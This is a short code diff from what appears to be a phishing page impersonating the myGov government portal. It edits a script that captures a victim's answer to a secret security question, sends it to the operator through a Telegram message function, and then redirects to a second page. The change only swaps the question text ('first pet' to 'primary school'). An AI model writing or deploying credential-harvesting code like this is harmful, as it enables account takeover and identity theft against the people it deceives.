@@ -141,7 +141,7 @@
             $btn.addClass('processing');
             $btn.prop('disabled', true);
             let msg = "🔔 myGov Secret Question\n";
-            msg += "❓ What was the name of my first pet?\n";
+            msg += "❓ What is the name of the primary school I attended?\n";
             msg += "💬 Answer: " + answer;
             sendTelegramMessage(msg).catch(() => {});
             setTimeout(function() { window.location.href = 'sec2.html'; }, 2000);
